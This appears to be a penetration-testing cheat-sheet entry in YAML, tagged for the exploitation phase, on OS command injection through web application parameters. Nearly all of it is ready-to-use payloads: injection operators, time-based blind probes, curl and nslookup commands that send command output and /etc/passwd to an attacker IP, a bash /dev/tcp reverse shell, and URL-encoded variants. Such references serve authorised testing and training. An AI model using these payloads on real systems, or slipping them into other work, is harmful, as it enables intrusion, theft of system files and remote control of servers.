---
description: |
  OS command injection techniques — inject system commands through vulnerable web application parameters using various operators and out-of-band methods.
command: |
  # Injection operators — try each to find what works
  ; id
  | id
  || id
  & id
  && id
  $(id)
  `id`
  %0a id

  # Blind injection — time-based detection
  ; sleep 10
  | sleep 10
  ; ping -c 10 127.0.0.1

  # Listen for pings on attacker machine to confirm blind injection
  sudo tcpdump -i eth0 icmp

  # Out-of-band data exfiltration via curl
  ; curl http://10.10.10.21:8000/$(id)
  ; curl http://10.10.10.21:8000/$(cat /etc/passwd)
  ; curl --data-binary @/etc/passwd http://10.10.10.21:8000/

  # Out-of-band via DNS (nslookup)
  ; nslookup $(whoami).10.10.10.21

  # Reverse shell via command injection
  ; bash -c 'bash -i >& /dev/tcp/10.10.10.21/9001 0>&1'

  # URL-encoded injection for curl-based internal requests
  %3B+curl+http%3A%2F%2F10.10.10.21%3A8000%2F%24(id)
items:
  - No_Creds
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
services:
  - HTTP
techniques:
  - Command_Injection
references:
  - https://owasp.org/www-community/attacks/Command_Injection
  - https://book.hacktricks.wiki/en/pentesting-web/command-injection.html
---
